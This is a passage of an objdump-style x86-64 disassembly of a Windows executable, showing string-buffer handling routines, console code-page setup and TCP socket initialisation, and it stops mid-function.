  404cb8:	56                   	push   %rsi
  404cb9:	53                   	push   %rbx
  404cba:	48 83 ec 30          	sub    $0x30,%rsp
  404cbe:	48 8b 0d bb 2c 01 00 	mov    0x12cbb(%rip),%rcx        # 0x417980
  404cc5:	ff 15 99 66 03 00    	call   *0x36699(%rip)        # 0x43b364
  404ccb:	48 8b 3d 6a 67 03 00 	mov    0x3676a(%rip),%rdi        # 0x43b43c
  404cd2:	ff d7                	call   *%rdi
  404cd4:	48 8b 35 b1 67 03 00 	mov    0x367b1(%rip),%rsi        # 0x43b48c
  404cdb:	48 89 c1             	mov    %rax,%rcx
  404cde:	ff d6                	call   *%rsi
  404ce0:	ba 00 80 00 00       	mov    $0x8000,%edx
  404ce5:	48 8b 1d d8 67 03 00 	mov    0x367d8(%rip),%rbx        # 0x43b4c4
  404cec:	89 c1                	mov    %eax,%ecx
  404cee:	ff d3                	call   *%rbx
  404cf0:	ff d7                	call   *%rdi
  404cf2:	48 8d 48 30          	lea    0x30(%rax),%rcx
  404cf6:	ff d6                	call   *%rsi
  404cf8:	ba 00 80 00 00       	mov    $0x8000,%edx
  404cfd:	89 c1                	mov    %eax,%ecx
  404cff:	ff d3                	call   *%rbx
  404d01:	ff d7                	call   *%rdi
  404d03:	48 8d 48 60          	lea    0x60(%rax),%rcx
  404d07:	ff d6                	call   *%rsi
  404d09:	ba 00 80 00 00       	mov    $0x8000,%edx
  404d0e:	89 c1                	mov    %eax,%ecx
  404d10:	ff d3                	call   *%rbx
  404d12:	48 8b 05 a7 26 01 00 	mov    0x126a7(%rip),%rax        # 0x4173c0
  404d19:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
  404d1e:	ff 10                	call   *(%rax)
  404d20:	48 8b 05 a9 26 01 00 	mov    0x126a9(%rip),%rax        # 0x4173d0
  404d27:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
  404d2c:	ff 10                	call   *(%rax)
  404d2e:	48 8b 0d 6b 2a 01 00 	mov    0x12a6b(%rip),%rcx        # 0x4177a0
  404d35:	e8 b2 dc ff ff       	call   0x4029ec
  404d3a:	48 89 c1             	mov    %rax,%rcx
  404d3d:	ff 15 31 66 03 00    	call   *0x36631(%rip)        # 0x43b374
  404d43:	48 85 c0             	test   %rax,%rax
  404d46:	74 10                	je     0x404d58
  404d48:	48 8d 15 af f7 00 00 	lea    0xf7af(%rip),%rdx        # 0x4144fe
  404d4f:	48 89 c1             	mov    %rax,%rcx
  404d52:	ff 15 ec 65 03 00    	call   *0x365ec(%rip)        # 0x43b344
  404d58:	48 8d 0d c8 34 00 00 	lea    0x34c8(%rip),%rcx        # 0x408227
  404d5f:	e8 f3 e8 ff ff       	call   0x403657
  404d64:	48 8d 0d a1 34 00 00 	lea    0x34a1(%rip),%rcx        # 0x40820c
  404d6b:	e8 e7 e8 ff ff       	call   0x403657
  404d70:	48 8d 0d 7a 34 00 00 	lea    0x347a(%rip),%rcx        # 0x4081f1
  404d77:	e8 db e8 ff ff       	call   0x403657
  404d7c:	48 8d 0d 53 34 00 00 	lea    0x3453(%rip),%rcx        # 0x4081d6
  404d83:	e8 cf e8 ff ff       	call   0x403657
  404d88:	e8 8a dd ff ff       	call   0x402b17
  404d8d:	48 8d 0d d6 dd ff ff 	lea    -0x222a(%rip),%rcx        # 0x402b6a
  404d94:	e8 be e8 ff ff       	call   0x403657
  404d99:	48 8b 05 20 24 01 00 	mov    0x12420(%rip),%rax        # 0x4171c0
  404da0:	b9 01 01 00 00       	mov    $0x101,%ecx
  404da5:	48 8d 15 74 25 02 00 	lea    0x22574(%rip),%rdx        # 0x427320
  404dac:	ff 10                	call   *(%rax)
  404dae:	85 c0                	test   %eax,%eax
  404db0:	74 0e                	je     0x404dc0
  404db2:	e8 e9 2b 00 00       	call   0x4079a0
  404db7:	31 d2                	xor    %edx,%edx
  404db9:	89 c1                	mov    %eax,%ecx
  404dbb:	e8 e0 32 00 00       	call   0x4080a0
  404dc0:	48 8d 0d 88 dd ff ff 	lea    -0x2278(%rip),%rcx        # 0x402b4f
  404dc7:	e8 8b e8 ff ff       	call   0x403657
  404dcc:	41 b8 06 00 00 00    	mov    $0x6,%r8d
  404dd2:	ba 01 00 00 00       	mov    $0x1,%edx
  404dd7:	48 8b 05 c2 23 01 00 	mov    0x123c2(%rip),%rax        # 0x4171a0
  404dde:	b9 02 00 00 00       	mov    $0x2,%ecx
  404de3:	ff 10                	call   *(%rax)
  404de5:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
  404de9:	48 89 c3             	mov    %rax,%rbx
  404dec:	75 0e                	jne    0x404dfc
  404dee:	e8 ad 2b 00 00       	call   0x4079a0
  404df3:	31 d2                	xor    %edx,%edx
  404df5:	89 c1                	mov    %eax,%ecx
  404df7:	e8 a4 32 00 00       	call   0x4080a0
  404dfc:	48 8d 74 24 28       	lea    0x28(%rsp),%rsi
  404e01:	48 89 d9             	mov    %rbx,%rcx
  404e04:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
  404e0b:	00 00 
  404e0d:	4c 8d 05 1c 92 00 00 	lea    0x921c(%rip),%r8        # 0x40e030
  404e14:	48 89 f2             	mov    %rsi,%rdx
  404e17:	e8 a1 dc ff ff       	call   0x402abd
  404e1c:	84 c0                	test   %al,%al
  404e1e:	75 0e                	jne    0x404e2e
  404e20:	e8 7b 2b 00 00       	call   0x4079a0
  404e25:	31 d2                	xor    %edx,%edx
  404e27:	89 c1                	mov    %eax,%ecx
  404e29:	e8 72 32 00 00       	call   0x4080a0
  404e2e:	4c 8d 05 eb 91 00 00 	lea    0x91eb(%rip),%r8        # 0x40e020
  404e35:	48 89 f2             	mov    %rsi,%rdx
  404e38:	48 89 d9             	mov    %rbx,%rcx
  404e3b:	e8 7d dc ff ff       	call   0x402abd
  404e40:	84 c0                	test   %al,%al
  404e42:	75 0e                	jne    0x404e52
  404e44:	e8 57 2b 00 00       	call   0x4079a0
  404e49:	31 d2                	xor    %edx,%edx
  404e4b:	89 c1                	mov    %eax,%ecx
  404e4d:	e8 4e 32 00 00       	call   0x4080a0
  404e52:	4c 8d 05 b7 91 00 00 	lea    0x91b7(%rip),%r8        # 0x40e010
  404e59:	48 89 f2             	mov    %rsi,%rdx
  404e5c:	48 89 d9             	mov    %rbx,%rcx
  404e5f:	e8 59 dc ff ff       	call   0x402abd
  404e64:	84 c0                	test   %al,%al
  404e66:	75 0e                	jne    0x404e76
  404e68:	e8 33 2b 00 00       	call   0x4079a0
  404e6d:	31 d2                	xor    %edx,%edx
  404e6f:	89 c1                	mov    %eax,%ecx
  404e71:	e8 2a 32 00 00       	call   0x4080a0
  404e76:	48 8b 05 33 23 01 00 	mov    0x12333(%rip),%rax        # 0x4171b0
  404e7d:	48 89 d9             	mov    %rbx,%rcx
  404e80:	ff 10                	call   *(%rax)
  404e82:	90                   	nop
  404e83:	48 83 c4 30          	add    $0x30,%rsp
  404e87:	5b                   	pop    %rbx
  404e88:	5e                   	pop    %rsi
  404e89:	5f                   	pop    %rdi
  404e8a:	c3                   	ret
  404e8b:	90                   	nop
  404e8c:	90                   	nop
  404e8d:	90                   	nop
  404e8e:	90                   	nop
  404e8f:	90                   	nop
  404e90:	56                   	push   %rsi
  404e91:	53                   	push   %rbx
  404e92:	48 83 ec 28          	sub    $0x28,%rsp
  404e96:	48 89 ce             	mov    %rcx,%rsi
  404e99:	48 8b 49 08          	mov    0x8(%rcx),%rcx
  404e9d:	0f b6 da             	movzbl %dl,%ebx
  404ea0:	89 da                	mov    %ebx,%edx
  404ea2:	e8 90 ee ff ff       	call   0x403d37
  404ea7:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
  404eab:	89 da                	mov    %ebx,%edx
  404ead:	e8 85 ee ff ff       	call   0x403d37
  404eb2:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
  404eb6:	89 da                	mov    %ebx,%edx
  404eb8:	e8 7a ee ff ff       	call   0x403d37
  404ebd:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
  404ec1:	89 da                	mov    %ebx,%edx
  404ec3:	48 83 c4 28          	add    $0x28,%rsp
  404ec7:	5b                   	pop    %rbx
  404ec8:	5e                   	pop    %rsi
  404ec9:	e9 69 ee ff ff       	jmp    0x403d37
  404ece:	e9 9e 37 00 00       	jmp    0x408671
  404ed3:	e9 ed 29 00 00       	jmp    0x4078c5
  404ed8:	41 56                	push   %r14
  404eda:	41 55                	push   %r13
  404edc:	41 54                	push   %r12
  404ede:	55                   	push   %rbp
  404edf:	57                   	push   %rdi
  404ee0:	56                   	push   %rsi
  404ee1:	53                   	push   %rbx
  404ee2:	48 81 ec 20 01 00 00 	sub    $0x120,%rsp
  404ee9:	4c 8b 2d 54 64 03 00 	mov    0x36454(%rip),%r13        # 0x43b344
  404ef0:	49 89 cc             	mov    %rcx,%r12
  404ef3:	48 89 d5             	mov    %rdx,%rbp
  404ef6:	41 ff d5             	call   *%r13
  404ef9:	48 85 c0             	test   %rax,%rax
  404efc:	0f 85 ef 00 00 00    	jne    0x404ff1
  404f02:	48 8d 7c 24 26       	lea    0x26(%rsp),%rdi
  404f07:	ba fa 00 00 00       	mov    $0xfa,%edx
  404f0c:	bb 01 00 00 00       	mov    $0x1,%ebx
  404f11:	48 89 f9             	mov    %rdi,%rcx
  404f14:	e8 33 f2 ff ff       	call   0x40414c
  404f19:	c6 44 24 26 5f       	movb   $0x5f,0x26(%rsp)
  404f1e:	8a 44 1d ff          	mov    -0x1(%rbp,%rbx,1),%al
  404f22:	84 c0                	test   %al,%al
  404f24:	74 0f                	je     0x404f35
  404f26:	88 04 1f             	mov    %al,(%rdi,%rbx,1)
  404f29:	48 ff c3             	inc    %rbx
  404f2c:	48 81 fb f5 00 00 00 	cmp    $0xf5,%rbx
  404f33:	75 e9                	jne    0x404f1e
  404f35:	c6 44 1c 26 40       	movb   $0x40,0x26(%rsp,%rbx,1)
  404f3a:	be 63 00 00 00       	mov    $0x63,%esi
  404f3f:	41 be 0a 00 00 00    	mov    $0xa,%r14d
  404f45:	48 8d 4e 9d          	lea    -0x63(%rsi),%rcx
  404f49:	48 81 fe c6 00 00 00 	cmp    $0xc6,%rsi
  404f50:	77 17                	ja     0x404f69
  404f52:	48 8d 56 a6          	lea    -0x5a(%rsi),%rdx
  404f56:	48 89 d8             	mov    %rbx,%rax
  404f59:	31 db                	xor    %ebx,%ebx
  404f5b:	48 83 fa 12          	cmp    $0x12,%rdx
  404f5f:	0f 97 c3             	seta   %bl
  404f62:	48 8d 5c 03 01       	lea    0x1(%rbx,%rax,1),%rbx
  404f67:	eb 04                	jmp    0x404f6d
  404f69:	48 83 c3 03          	add    $0x3,%rbx
  404f6d:	c6 44 1c 27 00       	movb   $0x0,0x27(%rsp,%rbx,1)
  404f72:	48 89 c8             	mov    %rcx,%rax
  404f75:	31 d2                	xor    %edx,%edx
  404f77:	49 f7 f6             	div    %r14
  404f7a:	48 89 c8             	mov    %rcx,%rax
  404f7d:	83 c2 30             	add    $0x30,%edx
  404f80:	88 14 1f             	mov    %dl,(%rdi,%rbx,1)
  404f83:	48 99                	cqto
  404f85:	48 ff cb             	dec    %rbx
  404f88:	49 f7 fe             	idiv   %r14
  404f8b:	48 85 c0             	test   %rax,%rax
  404f8e:	48 89 c1             	mov    %rax,%rcx
  404f91:	75 df                	jne    0x404f72
  404f93:	48 89 fa             	mov    %rdi,%rdx
  404f96:	4c 89 e1             	mov    %r12,%rcx
  404f99:	41 ff d5             	call   *%r13
  404f9c:	48 85 c0             	test   %rax,%rax
  404f9f:	75 50                	jne    0x404ff1
  404fa1:	48 83 c6 04          	add    $0x4,%rsi
  404fa5:	48 81 fe 2f 01 00 00 	cmp    $0x12f,%rsi
  404fac:	75 97                	jne    0x404f45
  404fae:	48 8b 1d 87 64 03 00 	mov    0x36487(%rip),%rbx        # 0x43b43c
  404fb5:	ff d3                	call   *%rbx
  404fb7:	48 8d 15 22 f8 00 00 	lea    0xf822(%rip),%rdx        # 0x4147e0
  404fbe:	48 8d 48 60          	lea    0x60(%rax),%rcx
  404fc2:	e8 4b c8 ff ff       	call   0x401812
  404fc7:	ff d3                	call   *%rbx
  404fc9:	48 89 ea             	mov    %rbp,%rdx
  404fcc:	48 8d 48 60          	lea    0x60(%rax),%rcx
  404fd0:	e8 3d c8 ff ff       	call   0x401812
  404fd5:	ff d3                	call   *%rbx
  404fd7:	48 8d 15 15 f8 00 00 	lea    0xf815(%rip),%rdx        # 0x4147f3
  404fde:	48 8d 48 60          	lea    0x60(%rax),%rcx
  404fe2:	e8 2b c8 ff ff       	call   0x401812
  404fe7:	b9 01 00 00 00       	mov    $0x1,%ecx
  404fec:	e8 17 66 00 00       	call   0x40b608
  404ff1:	48 81 c4 20 01 00 00 	add    $0x120,%rsp
  404ff8:	5b                   	pop    %rbx
  404ff9:	5e                   	pop    %rsi
  404ffa:	5f                   	pop    %rdi
  404ffb:	5d                   	pop    %rbp
  404ffc:	41 5c                	pop    %r12
  404ffe:	41 5d                	pop    %r13
  405000:	41 5e                	pop    %r14
  405002:	c3                   	ret
  405003:	56                   	push   %rsi
  405004:	53                   	push   %rbx
  405005:	48 83 ec 28          	sub    $0x28,%rsp
  405009:	48 8b 1d 2c 64 03 00 	mov    0x3642c(%rip),%rbx        # 0x43b43c
  405010:	48 89 ce             	mov    %rcx,%rsi
  405013:	ff d3                	call   *%rbx
  405015:	48 8d 15 d9 f7 00 00 	lea    0xf7d9(%rip),%rdx        # 0x4147f5
  40501c:	48 8d 48 60          	lea    0x60(%rax),%rcx
  405020:	e8 ed c7 ff ff       	call   0x401812
  405025:	48 89 f1             	mov    %rsi,%rcx
  405028:	e8 bf d9 ff ff       	call   0x4029ec
  40502d:	48 89 c6             	mov    %rax,%rsi
  405030:	ff d3                	call   *%rbx
  405032:	48 89 f2             	mov    %rsi,%rdx
  405035:	48 8d 48 60          	lea    0x60(%rax),%rcx
  405039:	e8 d4 c7 ff ff       	call   0x401812
  40503e:	ff d3                	call   *%rbx
  405040:	48 8d 15 ac f7 00 00 	lea    0xf7ac(%rip),%rdx        # 0x4147f3
  405047:	48 8d 48 60          	lea    0x60(%rax),%rcx
  40504b:	e8 c2 c7 ff ff       	call   0x401812
  405050:	b9 01 00 00 00       	mov    $0x1,%ecx
  405055:	e8 ae 65 00 00       	call   0x40b608
  40505a:	90                   	nop
  40505b:	48 83 ec 28          	sub    $0x28,%rsp
  40505f:	e8 88 d9 ff ff       	call   0x4029ec
  405064:	48 89 c1             	mov    %rax,%rcx
  405067:	48 83 c4 28          	add    $0x28,%rsp
  40506b:	48 ff 25 02 63 03 00 	rex.W jmp *0x36302(%rip)        # 0x43b374
  405072:	b8 04 00 00 00       	mov    $0x4,%eax
  405077:	48 85 c9             	test   %rcx,%rcx
  40507a:	7e 15                	jle    0x405091
  40507c:	48 81 f9 ff ff 00 00 	cmp    $0xffff,%rcx
  405083:	7f 05                	jg     0x40508a
  405085:	48 8d 04 09          	lea    (%rcx,%rcx,1),%rax
  405089:	c3                   	ret
  40508a:	48 8d 04 49          	lea    (%rcx,%rcx,2),%rax
  40508e:	48 d1 f8             	sar    $1,%rax
  405091:	c3                   	ret
  405092:	55                   	push   %rbp
  405093:	57                   	push   %rdi
  405094:	56                   	push   %rsi
  405095:	53                   	push   %rbx
  405096:	48 83 ec 28          	sub    $0x28,%rsp
  40509a:	48 85 c9             	test   %rcx,%rcx
  40509d:	48 89 ce             	mov    %rcx,%rsi
  4050a0:	89 d3                	mov    %edx,%ebx
  4050a2:	75 16                	jne    0x4050ba
  4050a4:	b9 01 00 00 00       	mov    $0x1,%ecx
  4050a9:	e8 2e 49 00 00       	call   0x4099dc
  4050ae:	48 89 c6             	mov    %rax,%rsi
  4050b1:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
  4050b8:	eb 46                	jmp    0x405100
  4050ba:	48 b9 ff ff ff ff ff 	movabs $0x3fffffffffffffff,%rcx
  4050c1:	ff ff 3f 
  4050c4:	48 23 4e 08          	and    0x8(%rsi),%rcx
  4050c8:	48 3b 0e             	cmp    (%rsi),%rcx
  4050cb:	7f 33                	jg     0x405100
  4050cd:	e8 a0 ff ff ff       	call   0x405072
  4050d2:	48 83 c6 10          	add    $0x10,%rsi
  4050d6:	48 89 c1             	mov    %rax,%rcx
  4050d9:	48 89 c5             	mov    %rax,%rbp
  4050dc:	e8 fb 48 00 00       	call   0x4099dc
  4050e1:	48 8b 56 f0          	mov    -0x10(%rsi),%rdx
  4050e5:	48 89 10             	mov    %rdx,(%rax)
  4050e8:	48 8b 7e f0          	mov    -0x10(%rsi),%rdi
  4050ec:	48 8d 50 10          	lea    0x10(%rax),%rdx
  4050f0:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
  4050f4:	48 89 d7             	mov    %rdx,%rdi
  4050f7:	f3 a4                	rep movsb (%rsi),(%rdi)
  4050f9:	48 89 68 08          	mov    %rbp,0x8(%rax)
  4050fd:	48 89 c6             	mov    %rax,%rsi
  405100:	48 8b 06             	mov    (%rsi),%rax
  405103:	88 5c 06 10          	mov    %bl,0x10(%rsi,%rax,1)
  405107:	c6 44 06 11 00       	movb   $0x0,0x11(%rsi,%rax,1)
  40510c:	48 ff c0             	inc    %rax
  40510f:	48 89 06             	mov    %rax,(%rsi)
  405112:	48 89 f0             	mov    %rsi,%rax
  405115:	48 83 c4 28          	add    $0x28,%rsp
  405119:	5b                   	pop    %rbx
  40511a:	5e                   	pop    %rsi
  40511b:	5f                   	pop    %rdi
  40511c:	5d                   	pop    %rbp
  40511d:	c3                   	ret
  40511e:	57                   	push   %rdi
  40511f:	56                   	push   %rsi
  405120:	53                   	push   %rbx
  405121:	48 83 ec 20          	sub    $0x20,%rsp
  405125:	48 85 c9             	test   %rcx,%rcx
  405128:	48 89 ce             	mov    %rcx,%rsi
  40512b:	75 0f                	jne    0x40513c
  40512d:	48 89 d1             	mov    %rdx,%rcx
  405130:	48 83 c4 20          	add    $0x20,%rsp
  405134:	5b                   	pop    %rbx
  405135:	5e                   	pop    %rsi
  405136:	5f                   	pop    %rdi
  405137:	e9 a0 48 00 00       	jmp    0x4099dc
  40513c:	48 89 d3             	mov    %rdx,%rbx
  40513f:	48 03 19             	add    (%rcx),%rbx
  405142:	48 b9 ff ff ff ff ff 	movabs $0x3fffffffffffffff,%rcx
  405149:	ff ff 3f 
  40514c:	48 23 4e 08          	and    0x8(%rsi),%rcx
  405150:	48 39 cb             	cmp    %rcx,%rbx
  405153:	7e 3a                	jle    0x40518f
  405155:	e8 18 ff ff ff       	call   0x405072
  40515a:	48 39 c3             	cmp    %rax,%rbx
  40515d:	48 0f 4d c3          	cmovge %rbx,%rax
  405161:	48 83 c6 10          	add    $0x10,%rsi
  405165:	48 89 c1             	mov    %rax,%rcx
  405168:	48 89 c3             	mov    %rax,%rbx
  40516b:	e8 6c 48 00 00       	call   0x4099dc
  405170:	48 8b 56 f0          	mov    -0x10(%rsi),%rdx
  405174:	48 89 10             	mov    %rdx,(%rax)
  405177:	48 8b 7e f0          	mov    -0x10(%rsi),%rdi
  40517b:	48 8d 50 10          	lea    0x10(%rax),%rdx
  40517f:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
  405183:	48 89 d7             	mov    %rdx,%rdi
  405186:	f3 a4                	rep movsb (%rsi),(%rdi)
  405188:	48 89 58 08          	mov    %rbx,0x8(%rax)
  40518c:	48 89 c6             	mov    %rax,%rsi
  40518f:	48 89 f0             	mov    %rsi,%rax
  405192:	48 83 c4 20          	add    $0x20,%rsp
  405196:	5b                   	pop    %rbx
  405197:	5e                   	pop    %rsi
  405198:	5f                   	pop    %rdi
  405199:	c3                   	ret
  40519a:	55                   	push   %rbp
  40519b:	57                   	push   %rdi
  40519c:	56                   	push   %rsi
  40519d:	53                   	push   %rbx
  40519e:	48 83 ec 28          	sub    $0x28,%rsp
  4051a2:	48 85 c9             	test   %rcx,%rcx
  4051a5:	48 89 ce             	mov    %rcx,%rsi
  4051a8:	0f 84 88 00 00 00    	je     0x405236
  4051ae:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
  4051b3:	79 07                	jns    0x4051bc
  4051b5:	48 83 41 f0 08       	addq   $0x8,-0x10(%rcx)
  4051ba:	eb 7a                	jmp    0x405236
  4051bc:	48 8b 29             	mov    (%rcx),%rbp
  4051bf:	b8 07 00 00 00       	mov    $0x7,%eax
  4051c4:	48 83 fd 07          	cmp    $0x7,%rbp
  4051c8:	48 0f 4c e8          	cmovl  %rax,%rbp
  4051cc:	48 83 c6 10          	add    $0x10,%rsi
  4051d0:	e8 42 d9 ff ff       	call   0x402b17
  4051d5:	48 8d 48 38          	lea    0x38(%rax),%rcx
  4051d9:	48 89 c7             	mov    %rax,%rdi
  4051dc:	e8 7f 42 00 00       	call   0x409460
  4051e1:	48 8d 8f a0 00 00 00 	lea    0xa0(%rdi),%rcx
  4051e8:	48 8d 55 21          	lea    0x21(%rbp),%rdx
  4051ec:	e8 5c cc ff ff       	call   0x401e4d
  4051f1:	48 8d 55 11          	lea    0x11(%rbp),%rdx
  4051f5:	48 89 c7             	mov    %rax,%rdi
  4051f8:	48 8d 5f 10          	lea    0x10(%rdi),%rbx
  4051fc:	48 c7 07 08 00 00 00 	movq   $0x8,(%rdi)
  405203:	48 8d 05 36 8e 00 00 	lea    0x8e36(%rip),%rax        # 0x40e040
  40520a:	48 89 d9             	mov    %rbx,%rcx
  40520d:	48 89 47 08          	mov    %rax,0x8(%rdi)
  405211:	e8 36 ef ff ff       	call   0x40414c
  405216:	48 8b 46 f0          	mov    -0x10(%rsi),%rax
  40521a:	48 89 6f 18          	mov    %rbp,0x18(%rdi)
  40521e:	48 89 47 10          	mov    %rax,0x10(%rdi)
  405222:	48 8b 56 f0          	mov    -0x10(%rsi),%rdx
  405226:	48 8d 47 20          	lea    0x20(%rdi),%rax
  40522a:	48 89 c7             	mov    %rax,%rdi
  40522d:	48 8d 4a 01          	lea    0x1(%rdx),%rcx
  405231:	f3 a4                	rep movsb (%rsi),(%rdi)
  405233:	48 89 de             	mov    %rbx,%rsi
  405236:	48 89 f0             	mov    %rsi,%rax
  405239:	48 83 c4 28          	add    $0x28,%rsp
  40523d:	5b                   	pop    %rbx
  40523e:	5e                   	pop    %rsi
  40523f:	5f                   	pop    %rdi
  405240:	5d                   	pop    %rbp
  405241:	c3                   	ret
  405242:	53                   	push   %rbx
  405243:	48 83 ec 30          	sub    $0x30,%rsp
  405247:	48 89 d3             	mov    %rdx,%rbx
  40524a:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
  40524f:	e8 c3 d8 ff ff       	call   0x402b17
  405254:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
  405259:	48 89 da             	mov    %rbx,%rdx
  40525c:	4c 8d 40 38          	lea    0x38(%rax),%r8
  405260:	e8 69 46 00 00       	call   0x4098ce
  405265:	48 89 da             	mov    %rbx,%rdx
  405268:	48 89 c1             	mov    %rax,%rcx
  40526b:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  405270:	e8 d7 ee ff ff       	call   0x40414c
  405275:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
  40527a:	48 83 c4 30          	add    $0x30,%rsp
  40527e:	5b                   	pop    %rbx
  40527f:	c3                   	ret
  405280:	53                   	push   %rbx
  405281:	48 83 ec 20          	sub    $0x20,%rsp
  405285:	bb 07 00 00 00       	mov    $0x7,%ebx
  40528a:	48 83 f9 07          	cmp    $0x7,%rcx
  40528e:	48 0f 4d d9          	cmovge %rcx,%rbx
  405292:	48 8d 0d a7 8d 00 00 	lea    0x8da7(%rip),%rcx        # 0x40e040
  405299:	48 8d 53 11          	lea    0x11(%rbx),%rdx
  40529d:	e8 a0 ff ff ff       	call   0x405242
  4052a2:	48 89 58 08          	mov    %rbx,0x8(%rax)
  4052a6:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
  4052ad:	48 83 c4 20          	add    $0x20,%rsp
  4052b1:	5b                   	pop    %rbx
  4052b2:	c3                   	ret
  4052b3:	53                   	push   %rbx
  4052b4:	48 83 ec 20          	sub    $0x20,%rsp
  4052b8:	48 89 cb             	mov    %rcx,%rbx
  4052bb:	e8 c0 ff ff ff       	call   0x405280
  4052c0:	48 89 18             	mov    %rbx,(%rax)
  4052c3:	48 83 c4 20          	add    $0x20,%rsp
  4052c7:	5b                   	pop    %rbx
  4052c8:	c3                   	ret
  4052c9:	41 56                	push   %r14
  4052cb:	41 55                	push   %r13
  4052cd:	41 54                	push   %r12
  4052cf:	55                   	push   %rbp
  4052d0:	57                   	push   %rdi
  4052d1:	56                   	push   %rsi
  4052d2:	53                   	push   %rbx
  4052d3:	48 83 ec 20          	sub    $0x20,%rsp
  4052d7:	41 bc 00 00 00 00    	mov    $0x0,%r12d
  4052dd:	48 85 d2             	test   %rdx,%rdx
  4052e0:	48 89 cb             	mov    %rcx,%rbx
  4052e3:	48 89 d5             	mov    %rdx,%rbp
  4052e6:	4c 0f 49 e2          	cmovns %rdx,%r12
  4052ea:	48 85 c9             	test   %rcx,%rcx
  4052ed:	75 0d                	jne    0x4052fc
  4052ef:	48 89 d1             	mov    %rdx,%rcx
  4052f2:	e8 bc ff ff ff       	call   0x4052b3
  4052f7:	48 89 c3             	mov    %rax,%rbx
  4052fa:	eb 62                	jmp    0x40535e
  4052fc:	48 b9 ff ff ff ff ff 	movabs $0x3fffffffffffffff,%rcx
  405303:	ff ff 3f 
  405306:	48 23 4b 08          	and    0x8(%rbx),%rcx
  40530a:	49 39 cc             	cmp    %rcx,%r12
  40530d:	7e 4f                	jle    0x40535e
  40530f:	e8 5e fd ff ff       	call   0x405072
  405314:	48 8d 73 10          	lea    0x10(%rbx),%rsi
  405318:	48 39 c2             	cmp    %rax,%rdx
  40531b:	48 0f 4d c2          	cmovge %rdx,%rax
  40531f:	48 89 c1             	mov    %rax,%rcx
  405322:	49 89 c6             	mov    %rax,%r14
  405325:	e8 b2 46 00 00       	call   0x4099dc
  40532a:	48 89 ea             	mov    %rbp,%rdx
  40532d:	49 89 c5             	mov    %rax,%r13
  405330:	48 8b 03             	mov    (%rbx),%rax
  405333:	49 89 45 00          	mov    %rax,0x0(%r13)
  405337:	48 8b 3b             	mov    (%rbx),%rdi
  40533a:	49 8d 45 10          	lea    0x10(%r13),%rax
  40533e:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
  405342:	48 89 c7             	mov    %rax,%rdi
  405345:	f3 a4                	rep movsb (%rsi),(%rdi)
  405347:	48 8b 03             	mov    (%rbx),%rax
  40534a:	4c 89 eb             	mov    %r13,%rbx
  40534d:	49 8d 4c 05 10       	lea    0x10(%r13,%rax,1),%rcx
  405352:	48 29 c2             	sub    %rax,%rdx
  405355:	e8 f2 ed ff ff       	call   0x40414c
  40535a:	4d 89 75 08          	mov    %r14,0x8(%r13)
  40535e:	48 89 d8             	mov    %rbx,%rax
  405361:	4c 89 23             	mov    %r12,(%rbx)
  405364:	42 c6 44 23 10 00    	movb   $0x0,0x10(%rbx,%r12,1)
  40536a:	48 83 c4 20          	add    $0x20,%rsp
  40536e:	5b                   	pop    %rbx
  40536f:	5e                   	pop    %rsi
  405370:	5f                   	pop    %rdi
  405371:	5d                   	pop    %rbp
  405372:	41 5c                	pop    %r12
  405374:	41 5d                	pop    %r13
  405376:	41 5e                	pop    %r14
  405378:	c3                   	ret
  405379:	56                   	push   %rsi
  40537a:	53                   	push   %rbx
  40537b:	48 83 ec 28          	sub    $0x28,%rsp
  40537f:	48 89 ce             	mov    %rcx,%rsi
  405382:	48 89 d3             	mov    %rdx,%rbx
  405385:	e8 fc 3f 00 00       	call   0x409386
  40538a:	84 c0                	test   %al,%al
  40538c:	75 1f                	jne    0x4053ad
  40538e:	48 85 db             	test   %rbx,%rbx
  405391:	74 05                	je     0x405398
  405393:	48 83 43 f0 08       	addq   $0x8,-0x10(%rbx)
  405398:	48 8b 0e             	mov    (%rsi),%rcx
  40539b:	48 81 f9 ff 0f 00 00 	cmp    $0xfff,%rcx
  4053a2:	76 09                	jbe    0x4053ad
  4053a4:	48 83 e9 10          	sub    $0x10,%rcx
  4053a8:	e8 56 e9 ff ff       	call   0x403d03
  4053ad:	48 89 1e             	mov    %rbx,(%rsi)
  4053b0:	48 83 c4 28          	add    $0x28,%rsp
  4053b4:	5b                   	pop    %rbx
  4053b5:	5e                   	pop    %rsi
  4053b6:	c3                   	ret
  4053b7:	41 57                	push   %r15
  4053b9:	41 56                	push   %r14
  4053bb:	41 55                	push   %r13
  4053bd:	41 54                	push   %r12
  4053bf:	55                   	push   %rbp
  4053c0:	57                   	push   %rdi
  4053c1:	56                   	push   %rsi
  4053c2:	53                   	push   %rbx
  4053c3:	48 83 ec 28          	sub    $0x28,%rsp
  4053c7:	48 89 cb             	mov    %rcx,%rbx
  4053ca:	48 8b 09             	mov    (%rcx),%rcx
  4053cd:	48 89 d5             	mov    %rdx,%rbp
  4053d0:	ba 01 00 00 00       	mov    $0x1,%edx
  4053d5:	e8 44 fd ff ff       	call   0x40511e
  4053da:	48 89 d9             	mov    %rbx,%rcx
  4053dd:	48 89 c2             	mov    %rax,%rdx
  4053e0:	e8 94 ff ff ff       	call   0x405379
  4053e5:	48 8b 0b             	mov    (%rbx),%rcx
  4053e8:	48 8d 15 e1 f7 00 00 	lea    0xf7e1(%rip),%rdx        # 0x414bd0
  4053ef:	e8 33 0c 00 00       	call   0x406027
  4053f4:	48 85 ed             	test   %rbp,%rbp
  4053f7:	0f 84 bd 02 00 00    	je     0x4056ba
  4053fd:	4c 8b 6d 00          	mov    0x0(%rbp),%r13
  405401:	31 ff                	xor    %edi,%edi
  405403:	4c 8d 35 46 f6 00 00 	lea    0xf646(%rip),%r14        # 0x414a50
